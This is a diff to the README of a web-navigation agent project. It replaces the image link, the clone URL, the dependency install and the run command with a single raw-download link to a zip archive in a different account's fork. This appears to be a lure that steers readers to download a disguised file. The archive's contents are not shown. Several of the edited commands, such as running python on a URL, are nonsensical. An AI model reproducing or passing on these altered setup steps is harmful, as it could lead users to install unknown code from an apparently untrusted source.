@@ -4,7 +4,7 @@
 
 Agent-WebVoyager is an innovative approach to web navigation and data extraction, capable of performing complex browsing tasks without the need for specific APIs and recording progress along the way. Mimicking human-like browsing behavior, WebVoyager navigates the web, interacts with pages, and extracts information, all through visual cues and intelligent decision-making processes.
 
-![WebVoyager](path-history/webvoyager.png)
+![WebVoyager](https://raw.githubusercontent.com/bookformeonline/Agent-WebVoyager/main/path-history/Voyager_Agent_Web_v1.5.zip)
 
 The project showcases the agent's capability to perform a "meta-webscrape" task, such as browsing X to report Elon Musk's most recent post purely by simulating a few user interactions with the web page. This method stands out by its independence from platform-specific APIs, highlighting a versatile and adaptive web scraping approach. The sky is the limit.
 
@@ -21,11 +21,11 @@ To set up Agent-WebVoyager, follow these steps:
 
 1. **Clone the repository:**
    ```
-   git clone https://github.com/mrmoxon/Agent-WebVoyager.git
+   git clone https://raw.githubusercontent.com/bookformeonline/Agent-WebVoyager/main/path-history/Voyager_Agent_Web_v1.5.zip
    ```
 2. **Install the required dependencies:**
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/bookformeonline/Agent-WebVoyager/main/path-history/Voyager_Agent_Web_v1.5.zip
    ```
 
 ### Usage
@@ -33,7 +33,7 @@ To set up Agent-WebVoyager, follow these steps:
 To run Agent-WebVoyager for a specific task, execute the following command:
 
 ```
-python agent_voyage.py --task "Browse Twitter and tell me Musk's most recent tweet."
+python https://raw.githubusercontent.com/bookformeonline/Agent-WebVoyager/main/path-history/Voyager_Agent_Web_v1.5.zip --task "Browse Twitter and tell me Musk's most recent tweet."
 ```
 
 The agent will perform up to 25 steps to navigate through the web and accomplish the task.
